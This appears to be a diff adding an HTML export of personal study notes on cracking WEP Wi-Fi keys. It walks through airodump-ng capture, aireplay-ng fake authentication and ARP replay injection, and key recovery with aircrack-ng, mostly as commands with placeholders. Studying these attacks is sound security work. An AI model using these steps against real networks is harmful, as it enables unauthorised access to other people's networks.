@@ -1,0 +1,40 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="author" content="MarkdownViewer++" />
+        <title>WEP.md</title>
+        <style type="text/css">
+            
+/* Avoid page breaks inside the most common attributes, especially for exports (i.e. PDF) */
+td, h1, h2, h3, h4, h5, p, ul, ol, li {
+    page-break-inside: avoid; 
+}
+
+        </style>
+      </head>
+    <body>
+        <p><a href="..">Back</a></p>
+<p>it is the easiest to crack<br />
+airodump-ng --bssid <bssid> --channel <channel> --write <file> <mon mode adapter> to start capturing IPs</p>
+<p>FOR NETWORK WITH BUSY TRAFFIC AND HIGH NUMBER OF #Data RECIEVED IN AIRODUMP ATTACK<br />
+aircrack-ng <name of cap file from write file> will crack WEP code<br />
+it will give a number which looks like a MAC address and also a ASCII code.<br />
+Just removing the colons from the MAC address like code will give the passwd.</p>
+<p>FOR DORMANT NETWORKS<br />
+we can use fake authentication attack<br />
+airodump-ng --bssid <target> --channel <ch> --write <file> <mon adapter> to collecting date<br />
+aireplay-ng --fakeauth <number of attacks> -a <target bssid> -h <our bssid> <mon adapter>to start fakeauth attack and associate with it<br />
+our bssid can be found at first 12 digits with -'s after unspec in ifconfig, remove - and put :</p>
+<p>aireplay-ng --arpreplay -b <target> -h <our bssid> <mon adapter> to start injecting packets and force router to send new iv's<br />
+Before starting arpreplay attack, reassociate with the network again.<br />
+after arpreplay attack, wait until we recieve arp packets<br />
+once we recieve arp packets, data will be recieved at high rates, associate with network once again before using aircrack-ng<br />
+aircrack-ng <cap file> to start cracking<br />
+repeat this until you succeed</p>
+<p><a href="..">Back</a></p>
+
+    </body>
+</html>
+            
